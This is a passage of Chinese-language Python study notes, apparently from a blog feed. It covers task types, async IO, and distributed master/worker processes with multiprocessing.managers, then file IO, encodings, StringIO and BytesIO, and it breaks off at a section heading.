IO密集型</h3><p>是否采用多任务的第二个考虑是任务的类型。我们可以把任务分为计算密集型和IO密集型。</p><p>计算密集型任务的特点是要进行大量的计算，消耗CPU资源，比如计算圆周率、对视频进行高清解码等等，全靠CPU的运算能力。这种计算密集型任务虽然也可以用多任务完成，但是任务越多，花在任务切换的时间就越多，CPU执行任务的效率就越低，所以，要最高效地利用CPU，计算密集型任务同时进行的数量应当等于CPU的核心数。</p><p>计算密集型任务由于主要消耗CPU资源，因此，代码运行效率至关重要。Python这样的脚本语言运行效率很低，完全不适合计算密集型任务。对于计算密集型任务，最好用C语言编写。</p><p>第二种任务的类型是IO密集型，涉及到网络、磁盘IO的任务都是IO密集型任务，这类任务的特点是CPU消耗很少，任务的大部分时间都在等待IO操作完成（因为IO的速度远远低于CPU和内存的速度）。对于IO密集型任务，任务越多，CPU效率越高，但也有一个限度。常见的大部分任务都是IO密集型任务，比如Web应用。</p><p>IO密集型任务执行期间，99%的时间都花在IO上，花在CPU上的时间很少，因此，用运行速度极快的C语言替换用Python这样运行速度极低的脚本语言，完全无法提升运行效率。对于IO密集型任务，最合适的语言就是开发效率最高（代码量最少）的语言，脚本语言是首选，C语言最差。</p><h3 id="10-4-3-异步-IO"><a href="#10-4-3-异步-IO" class="headerlink" title="10.4.3 异步 IO"></a>10.4.3 异步 IO</h3><p>考虑到CPU和IO之间巨大的速度差异，一个任务在执行的过程中大部分时间都在等待IO操作，单进程单线程模型会导致别的任务无法并行执行，因此，我们才需要多进程模型或者多线程模型来支持多任务并发执行。</p><p>现代操作系统对IO操作已经做了巨大的改进，最大的特点就是支持异步IO。如果充分利用操作系统提供的异步IO支持，就可以用单进程单线程模型来执行多任务，这种全新的模型称为事件驱动模型，Nginx就是支持异步IO的Web服务器，它在单核CPU上采用单进程模型就可以高效地支持多任务。在多核CPU上，可以运行多个进程（数量与CPU核心数相同），充分利用多核CPU。由于系统总的进程数量十分有限，因此操作系统调度非常高效。用异步IO编程模型来实现多任务是一个主要的趋势。</p><p>对应到Python语言，单线程的异步编程模型称为协程，有了协程的支持，就可以基于事件驱动编写高效的多任务程序。我们会在后面讨论如何编写协程。</p><h2 id="10-5-分布式进程"><a href="#10-5-分布式进程" class="headerlink" title="10.5 分布式进程"></a>10.5 分布式进程</h2><p>在Thread和Process中，应当优选Process，因为Process更稳定，而且，Process可以分布到多台机器上，而Thread最多只能分布到同一台机器的多个CPU上。</p><p>Python的<code>multiprocessing</code>模块不但支持多进程，其中<code>managers</code>子模块还支持把多进程分布到多台机器上。一个服务进程可以作为调度者，将任务分布到其他多个进程中，依靠网络通信。由于<code>managers</code>模块封装很好，不必了解网络通信的细节，就可以很容易地编写分布式多进程程序。</p><p>举个例子：如果我们已经有一个通过<code>Queue</code>通信的多进程程序在同一台机器上运行，现在，由于处理任务的进程任务繁重，希望把发送任务的进程和处理任务的进程分布到两台机器上。怎么用分布式进程实现？</p><p>原有的<code>Queue</code>可以继续使用，但是，通过<code>managers</code>模块把<code>Queue</code>通过网络暴露出去，就可以让其他机器的进程访问<code>Queue</code>了。</p><p>我们先看服务进程，服务进程负责启动<code>Queue</code>，把<code>Queue</code>注册到网络上，然后往<code>Queue</code>里面写入任务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># task_master.py</span><br><span class="line"></span><br><span class="line">import random, time, queue</span><br><span class="line">from multiprocessing.managers import BaseManager</span><br><span class="line"></span><br><span class="line"># 发送任务的队列:</span><br><span class="line">task_queue = queue.Queue()</span><br><span class="line"># 接收结果的队列:</span><br><span class="line">result_queue = queue.Queue()</span><br><span class="line"></span><br><span class="line"># 从BaseManager继承的QueueManager:</span><br><span class="line">class QueueManager(BaseManager):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"># 把两个Queue都注册到网络上, callable参数关联了Queue对象:</span><br><span class="line">QueueManager.register(&#x27;get_task_queue&#x27;, callable=lambda: task_queue)</span><br><span class="line">QueueManager.register(&#x27;get_result_queue&#x27;, callable=lambda: result_queue)</span><br><span class="line"># 绑定端口5000, 设置验证码&#x27;abc&#x27;:</span><br><span class="line">manager = QueueManager(address=(&#x27;&#x27;, 5000), authkey=b&#x27;abc&#x27;)</span><br><span class="line"># 启动Queue:</span><br><span class="line">manager.start()</span><br><span class="line"># 获得通过网络访问的Queue对象:</span><br><span class="line">task = manager.get_task_queue()</span><br><span class="line">result = manager.get_result_queue()</span><br><span class="line"># 放几个任务进去:</span><br><span class="line">for i in range(10):</span><br><span class="line">    n = random.randint(0, 10000)</span><br><span class="line">    print(&#x27;Put task %d...&#x27; % n)</span><br><span class="line">    task.put(n)</span><br><span class="line"># 从result队列读取结果:</span><br><span class="line">print(&#x27;Try get results...&#x27;)</span><br><span class="line">for i in range(10):</span><br><span class="line">    r = result.get(timeout=10)</span><br><span class="line">    print(&#x27;Result: %s&#x27; % r)</span><br><span class="line"># 关闭:</span><br><span class="line">manager.shutdown()</span><br><span class="line">print(&#x27;master exit.&#x27;)</span><br></pre></td></tr></table></figure><p>请注意，当我们在一台机器上写多进程程序时，创建的<code>Queue</code>可以直接拿来用，但是，在分布式多进程环境下，添加任务到<code>Queue</code>不可以直接对原始的<code>task_queue</code>进行操作，那样就绕过了<code>QueueManager</code>的封装，必须通过<code>manager.get_task_queue()</code>获得的<code>Queue</code>接口添加。</p><p>然后，在另一台机器上启动任务进程（本机上启动也可以）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"># task_worker.py</span><br><span class="line"></span><br><span class="line">import time, sys, queue</span><br><span class="line">from multiprocessing.managers import BaseManager</span><br><span class="line"></span><br><span class="line"># 创建类似的QueueManager:</span><br><span class="line">class QueueManager(BaseManager):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"># 由于这个QueueManager只从网络上获取Queue，所以注册时只提供名字:</span><br><span class="line">QueueManager.register(&#x27;get_task_queue&#x27;)</span><br><span class="line">QueueManager.register(&#x27;get_result_queue&#x27;)</span><br><span class="line"></span><br><span class="line"># 连接到服务器，也就是运行task_master.py的机器:</span><br><span class="line">server_addr = &#x27;127.0.0.1&#x27;</span><br><span class="line">print(&#x27;Connect to server %s...&#x27; % server_addr)</span><br><span class="line"># 端口和验证码注意保持与task_master.py设置的完全一致:</span><br><span class="line">m = QueueManager(address=(server_addr, 5000), authkey=b&#x27;abc&#x27;)</span><br><span class="line"># 从网络连接:</span><br><span class="line">m.connect()</span><br><span class="line"># 获取Queue的对象:</span><br><span class="line">task = m.get_task_queue()</span><br><span class="line">result = m.get_result_queue()</span><br><span class="line"># 从task队列取任务,并把结果写入result队列:</span><br><span class="line">for i in range(10):</span><br><span class="line">    try:</span><br><span class="line">        n = task.get(timeout=1)</span><br><span class="line">        print(&#x27;run task %d * %d...&#x27; % (n, n))</span><br><span class="line">        r = &#x27;%d * %d = %d&#x27; % (n, n, n*n)</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        result.put(r)</span><br><span class="line">    except Queue.Empty:</span><br><span class="line">        print(&#x27;task queue is empty.&#x27;)</span><br><span class="line"># 处理结束:</span><br><span class="line">print(&#x27;worker exit.&#x27;)</span><br></pre></td></tr></table></figure><p>任务进程要通过网络连接到服务进程，所以要指定服务进程的IP。</p><p>现在，可以试试分布式进程的工作效果了。先启动<code>task_master.py</code>服务进程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python3 task_master.py </span><br><span class="line">Put task 3411...</span><br><span class="line">Put task 1605...</span><br><span class="line">Put task 1398...</span><br><span class="line">Put task 4729...</span><br><span class="line">Put task 5300...</span><br><span class="line">Put task 7471...</span><br><span class="line">Put task 68...</span><br><span class="line">Put task 4219...</span><br><span class="line">Put task 339...</span><br><span class="line">Put task 7866...</span><br><span class="line">Try get results...</span><br></pre></td></tr></table></figure><p><code>task_master.py</code>进程发送完任务后，开始等待<code>result</code>队列的结果。现在启动<code>task_worker.py</code>进程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ python3 task_worker.py</span><br><span class="line">Connect to server 127.0.0.1...</span><br><span class="line">run task 3411 * 3411...</span><br><span class="line">run task 1605 * 1605...</span><br><span class="line">run task 1398 * 1398...</span><br><span class="line">run task 4729 * 4729...</span><br><span class="line">run task 5300 * 5300...</span><br><span class="line">run task 7471 * 7471...</span><br><span class="line">run task 68 * 68...</span><br><span class="line">run task 4219 * 4219...</span><br><span class="line">run task 339 * 339...</span><br><span class="line">run task 7866 * 7866...</span><br><span class="line">worker exit.</span><br></pre></td></tr></table></figure><p><code>task_worker.py</code>进程结束，在<code>task_master.py</code>进程中会继续打印出结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Result: 3411 * 3411 = 11634921</span><br><span class="line">Result: 1605 * 1605 = 2576025</span><br><span class="line">Result: 1398 * 1398 = 1954404</span><br><span class="line">Result: 4729 * 4729 = 22363441</span><br><span class="line">Result: 5300 * 5300 = 28090000</span><br><span class="line">Result: 7471 * 7471 = 55815841</span><br><span class="line">Result: 68 * 68 = 4624</span><br><span class="line">Result: 4219 * 4219 = 17799961</span><br><span class="line">Result: 339 * 339 = 114921</span><br><span class="line">Result: 7866 * 7866 = 61873956</span><br></pre></td></tr></table></figure><p>这个简单的Master&#x2F;Worker模型有什么用？其实这就是一个简单但真正的分布式计算，把代码稍加改造，启动多个worker，就可以把任务分布到几台甚至几十台机器上，比如把计算<code>n*n</code>的代码换成发送邮件，就实现了邮件队列的异步发送。</p><p>Queue对象存储在哪？注意到<code>task_worker.py</code>中根本没有创建Queue的代码，所以，Queue对象存储在<code>task_master.py</code>进程中：</p><p><img src="https://cos.gjcloak.xyz/images/01/20200821095150.png" alt="image-20200821095149037" title="image-20200821095149037"></p><p>而<code>Queue</code>之所以能通过网络访问，就是通过<code>QueueManager</code>实现的。由于<code>QueueManager</code>管理的不止一个<code>Queue</code>，所以，要给每个<code>Queue</code>的网络调用接口起个名字，比如<code>get_task_queue</code>。</p><p><code>authkey</code>有什么用？这是为了保证两台机器正常通信，不被其他机器恶意干扰。如果<code>task_worker.py</code>的<code>authkey</code>和<code>task_master.py</code>的<code>authkey</code>不一致，肯定连接不上。</p><blockquote><p>小结：</p></blockquote><p>Python的分布式进程接口简单，封装良好，适合需要把繁重任务分布到多台机器的环境下。</p><p>注意Queue的作用是用来传递任务和接收结果，每个任务的描述数据量要尽量小。比如发送一个处理日志文件的任务，就不要发送几百兆的日志文件本身，而是发送日志文件存放的完整路径，由Worker进程再去共享的磁盘上读取文件。</p><h2 id="10-6-参考资料"><a href="#10-6-参考资料" class="headerlink" title="10.6 参考资料"></a>10.6 参考资料</h2><ul><li><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017627212385376">廖雪峰 - Python 3.x - 进程和线程</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 线程 </tag>
            
            <tag> 进程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习笔记(九)· IO 编程</title>
      <link href="/104.html"/>
      <url>/104.html</url>
      
        <content type="html"><![CDATA[<p>IO在计算机中指Input&#x2F;Output，也就是输入和输出。由于程序和运行时数据是在内存中驻留，由CPU这个超快的计算核心来执行，涉及到数据交换的地方，通常是磁盘、网络等，就需要IO接口。</p><p>比如你打开浏览器，访问新浪首页，浏览器这个程序就需要通过网络IO获取新浪的网页。浏览器首先会发送数据给新浪服务器，告诉它我想要首页的HTML，这个动作是往外发数据，叫Output，随后新浪服务器把网页发过来，这个动作是从外面接收数据，叫Input。所以，通常，程序完成IO操作会有Input和Output两个数据流。当然也有只用一个的情况，比如，从磁盘读取文件到内存，就只有Input操作，反过来，把数据写到磁盘文件里，就只是一个Output操作。</p><p>IO编程中，Stream（流）是一个很重要的概念，可以把流想象成一个水管，数据就是水管里的水，但是只能单向流动。Input Stream就是数据从外面（磁盘、网络）流进内存，Output Stream就是数据从内存流到外面去。对于浏览网页来说，浏览器和新浪服务器之间至少需要建立两根水管，才可以既能发数据，又能收数据。</p><p>由于CPU和内存的速度远远高于外设的速度，所以，在IO编程中，就存在速度严重不匹配的问题。举个例子来说，比如要把100M的数据写入磁盘，CPU输出100M的数据只需要0.01秒，可是磁盘要接收这100M数据可能需要10秒，怎么办呢？有两种办法：</p><p>第一种是CPU等着，也就是程序暂停执行后续代码，等100M的数据在10秒后写入磁盘，再接着往下执行，这种模式称为同步IO；</p><p>另一种方法是CPU不等待，只是告诉磁盘，“您老慢慢写，不着急，我接着干别的事去了”，于是，后续代码可以立刻接着执行，这种模式称为异步IO。</p><p>同步和异步的区别就在于是否等待IO执行的结果。好比你去麦当劳点餐，你说“来个汉堡”，服务员告诉你，对不起，汉堡要现做，需要等5分钟，于是你站在收银台前面等了5分钟，拿到汉堡再去逛商场，这是同步IO。</p><p>你说“来个汉堡”，服务员告诉你，汉堡需要等5分钟，你可以先去逛商场，等做好了，我们再通知你，这样你可以立刻去干别的事情（逛商场），这是异步IO。</p><p>很明显，使用异步IO来编写程序性能会远远高于同步IO，但是异步IO的缺点是编程模型复杂。想想看，你得知道什么时候通知你“汉堡做好了”，而通知你的方法也各不相同。如果是服务员跑过来找到你，这是回调模式，如果服务员发短信通知你，你就得不停地检查手机，这是轮询模式。总之，异步IO的复杂度远远高于同步IO。</p><p>操作IO的能力都是由操作系统提供的，每一种编程语言都会把操作系统提供的低级C接口封装起来方便使用，Python也不例外。我们后面会详细讨论Python的IO编程接口。</p><p>注意，本章的IO编程都是同步模式。</p><h2 id="9-1-文件读写"><a href="#9-1-文件读写" class="headerlink" title="9.1 文件读写"></a>9.1 文件读写</h2><p>读写文件是最常见的IO操作。Python内置了读写文件的函数，用法和C是兼容的。</p><p>读写文件前，我们先必须了解一下，在磁盘上读写文件的功能都是由操作系统提供的，现代操作系统不允许普通的程序直接操作磁盘，所以，读写文件就是请求操作系统打开一个文件对象（通常称为文件描述符），然后，通过操作系统提供的接口从这个文件对象中读取数据（读文件），或者把数据写入这个文件对象（写文件）。</p><h3 id="9-1-1-读文件"><a href="#9-1-1-读文件" class="headerlink" title="9.1.1 读文件"></a>9.1.1 读文件</h3><p>要以读文件的模式打开一个文件对象，使用Python内置的<code>open()</code>函数，传入文件名和标示符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = open(&#x27;/Users/michael/test.txt&#x27;, &#x27;r&#x27;)</span><br></pre></td></tr></table></figure><p>标示符’r’表示读，这样，我们就成功地打开了一个文件。</p><p>如果文件不存在，<code>open()</code>函数就会抛出一个<code>IOError</code>的错误，并且给出错误码和详细的信息告诉你文件不存在：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f=open(&#x27;/Users/michael/notfound.txt&#x27;, &#x27;r&#x27;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">FileNotFoundError: [Errno 2] No such file or directory: &#x27;/Users/michael/notfound.txt&#x27;</span><br></pre></td></tr></table></figure><p>如果文件打开成功，接下来，调用<code>read()</code>方法可以一次读取文件的全部内容，Python把内容读到内存，用一个<code>str</code>对象表示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f.read()</span><br><span class="line">&#x27;Hello, world!&#x27;</span><br></pre></td></tr></table></figure><p>最后一步是调用<code>close()</code>方法关闭文件。文件使用完毕后必须关闭，因为文件对象会占用操作系统的资源，并且操作系统同一时间能打开的文件数量也是有限的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f.close()</span><br></pre></td></tr></table></figure><p>由于文件读写时都有可能产生<code>IOError</code>，一旦出错，后面的<code>f.close()</code>就不会调用。所以，为了保证无论是否出错都能正确地关闭文件，我们可以使用<code>try ... finally</code>来实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    f = open(&#x27;/path/to/file&#x27;, &#x27;r&#x27;)</span><br><span class="line">    print(f.read())</span><br><span class="line">finally:</span><br><span class="line">    if f:</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure><p>但是每次都这么写实在太繁琐，所以，Python引入了<code>with</code>语句来自动帮我们调用<code>close()</code>方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&#x27;/path/to/file&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">    print(f.read())</span><br></pre></td></tr></table></figure><p>这和前面的<code>try ... finally</code>是一样的，但是代码更佳简洁，并且不必调用<code>f.close()</code>方法。</p><p>调用<code>read()</code>会一次性读取文件的全部内容，如果文件有10G，内存就爆了，所以，要保险起见，可以反复调用<code>read(size)</code>方法，每次最多读取size个字节的内容。另外，调用<code>readline()</code>可以每次读取一行内容，调用<code>readlines()</code>一次读取所有内容并按行返回<code>list</code>。因此，要根据需要决定怎么调用。</p><p>如果文件很小，<code>read()</code>一次性读取最方便；如果不能确定文件大小，反复调用<code>read(size)</code>比较保险；如果是配置文件，调用<code>readlines()</code>最方便：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for line in f.readlines():</span><br><span class="line">    print(line.strip()) # 把末尾的&#x27;\n&#x27;删掉</span><br></pre></td></tr></table></figure><h3 id="9-1-2-file-like-Object"><a href="#9-1-2-file-like-Object" class="headerlink" title="9.1.2 file-like Object"></a>9.1.2 file-like Object</h3><p>像<code>open()</code>函数返回的这种有个<code>read()</code>方法的对象，在Python中统称为file-like Object。除了file外，还可以是内存的字节流，网络流，自定义流等等。file-like Object不要求从特定类继承，只要写个<code>read()</code>方法就行。</p><p><code>StringIO</code>就是在内存中创建的file-like Object，常用作临时缓冲。</p><h3 id="9-1-3-二进制文件"><a href="#9-1-3-二进制文件" class="headerlink" title="9.1.3 二进制文件"></a>9.1.3 二进制文件</h3><p>前面讲的默认都是读取文本文件，并且是UTF-8编码的文本文件。要读取二进制文件，比如图片、视频等等，用<code>&#39;rb&#39;</code>模式打开文件即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = open(&#x27;/Users/michael/test.jpg&#x27;, &#x27;rb&#x27;)</span><br><span class="line">&gt;&gt;&gt; f.read()</span><br><span class="line">b&#x27;\xff\xd8\xff\xe1\x00\x18Exif\x00\x00...&#x27; # 十六进制表示的字节</span><br></pre></td></tr></table></figure><h3 id="9-1-4-字符编码"><a href="#9-1-4-字符编码" class="headerlink" title="9.1.4 字符编码"></a>9.1.4 字符编码</h3><p>要读取非UTF-8编码的文本文件，需要给<code>open()</code>函数传入<code>encoding</code>参数，例如，读取GBK编码的文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = open(&#x27;/Users/michael/gbk.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;gbk&#x27;)</span><br><span class="line">&gt;&gt;&gt; f.read()</span><br><span class="line">&#x27;测试&#x27;</span><br></pre></td></tr></table></figure><p>遇到有些编码不规范的文件，你可能会遇到<code>UnicodeDecodeError</code>，因为在文本文件中可能夹杂了一些非法编码的字符。遇到这种情况，<code>open()</code>函数还接收一个<code>errors</code>参数，表示如果遇到编码错误后如何处理。最简单的方式是直接忽略：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = open(&#x27;/Users/michael/gbk.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;gbk&#x27;, errors=&#x27;ignore&#x27;)</span><br></pre></td></tr></table></figure><h3 id="9-1-5-写文件"><a href="#9-1-5-写文件" class="headerlink" title="9.1.5 写文件"></a>9.1.5 写文件</h3><p>写文件和读文件是一样的，唯一区别是调用<code>open()</code>函数时，传入标识符<code>&#39;w&#39;</code>或者<code>&#39;wb&#39;</code>表示写文本文件或写二进制文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = open(&#x27;/Users/michael/test.txt&#x27;, &#x27;w&#x27;)</span><br><span class="line">&gt;&gt;&gt; f.write(&#x27;Hello, world!&#x27;)</span><br><span class="line">&gt;&gt;&gt; f.close()</span><br></pre></td></tr></table></figure><p>你可以反复调用<code>write()</code>来写入文件，但是务必要调用<code>f.close()</code>来关闭文件。当我们写文件时，操作系统往往不会立刻把数据写入磁盘，而是放到内存缓存起来，空闲的时候再慢慢写入。只有调用<code>close()</code>方法时，操作系统才保证把没有写入的数据全部写入磁盘。忘记调用<code>close()</code>的后果是数据可能只写了一部分到磁盘，剩下的丢失了。所以，还是用<code>with</code>语句来得保险：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&#x27;/Users/michael/test.txt&#x27;, &#x27;w&#x27;) as f:</span><br><span class="line">    f.write(&#x27;Hello, world!&#x27;)</span><br></pre></td></tr></table></figure><p>要写入特定编码的文本文件，请给<code>open()</code>函数传入<code>encoding</code>参数，将字符串自动转换成指定编码。</p><p>细心的童鞋会发现，以<code>&#39;w&#39;</code>模式写入文件时，如果文件已存在，会直接覆盖（相当于删掉后新写入一个文件）。如果我们希望追加到文件末尾怎么办？可以传入<code>&#39;a&#39;</code>以追加（append）模式写入。</p><p>所有模式的定义及含义可以参考Python的<a href="https://docs.python.org/3/library/functions.html#open">官方文档</a>。</p><h2 id="9-2-StringIO-和-BytesIO"><a href="#9-2-StringIO-和-BytesIO" class="headerlink" title="9.2 StringIO 和 BytesIO"></a>9.2 StringIO 和 BytesIO</h2><h3 id="9-2-1-StringIO"><a href="#9-2-1-StringIO" class="headerlink" title="9.2.1 StringIO"></a>9.2.1 StringIO</h3><p>很多时候，数据读写不一定是文件，也可以在内存中读写。</p><p>StringIO顾名思义就是在内存中读写str。</p><p>要把str写入StringIO，我们需要先创建一个StringIO，然后，像文件一样写入即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from io import StringIO</span><br><span class="line">&gt;&gt;&gt; f = StringIO()</span><br><span class="line">&gt;&gt;&gt; f.write(&#x27;hello&#x27;)</span><br><span class="line">5</span><br><span class="line">&gt;&gt;&gt; f.write(&#x27; &#x27;)</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; f.write(&#x27;world!&#x27;)</span><br><span class="line">6</span><br><span class="line">&gt;&gt;&gt; print(f.getvalue())</span><br><span class="line">hello world!</span><br></pre></td></tr></table></figure><p><code>getvalue()</code>方法用于获得写入后的str。</p><p>要读取StringIO，可以用一个str初始化StringIO，然后，像读文件一样读取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from io import StringIO</span><br><span class="line">&gt;&gt;&gt; f = StringIO(&#x27;Hello!\nHi!\nGoodbye!&#x27;)</span><br><span class="line">&gt;&gt;&gt; while True:</span><br><span class="line">...     s = f.readline()</span><br><span class="line">...     if s == &#x27;&#x27;:</span><br><span class="line">...         break</span><br><span class="line">...     print(s.strip())</span><br><span class="line">...</span><br><span class="line">Hello!</span><br><span class="line">Hi!</span><br><span class="line">Goodbye!</span><br></pre></td></tr></table></figure><h3 id="9-2-2-BytesIO"><a href="#9-2-2-BytesIO" class="headerlink" title="9.2.2 BytesIO"></a>9.2.2 BytesIO</h3><p>StringIO操作的只能是str，如果要操作二进制数据，就需要使用BytesIO。</p><p>BytesIO实现了在内存中读写bytes，我们创建一个BytesIO，然后写入一些bytes：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from io import BytesIO</span><br><span class="line">&gt;&gt;&gt; f = BytesIO()</span><br><span class="line">&gt;&gt;&gt; f.write(&#x27;中文&#x27;.encode(&#x27;utf-8&#x27;))</span><br><span class="line">6</span><br><span class="line">&gt;&gt;&gt; print(f.getvalue())</span><br><span class="line">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span><br></pre></td></tr></table></figure><p>请注意，写入的不是str，而是经过UTF-8编码的bytes。</p><p>和StringIO类似，可以用一个bytes初始化BytesIO，然后，像读文件一样读取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from io import BytesIO</span><br><span class="line">&gt;&gt;&gt; f = BytesIO(b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;)</span><br><span class="line">&gt;&gt;&gt; f.read()</span><br><span class="line">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span><br></pre></td></tr></table></figure><p>请注意，写入的不是str，而是经过UTF-8编码的bytes。</p><p>和StringIO类似，可以用一个bytes初始化BytesIO，然后，像读文件一样读取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from io import BytesIO</span><br><span class="line">&gt;&gt;&gt; f = BytesIO(b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;)</span><br><span class="line">&gt;&gt;&gt; f.read()</span><br><span class="line">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>小结：</p></blockquote><p>StringIO和BytesIO是在内存中操作str和bytes的方法，使得和读写文件具有一致的接口。</p><h2 id="9-3-操作文件和目录"><a href="#9-3-操作文件和目录" class="headerlink" title="9.3 操作文件和目录"></a>9.3 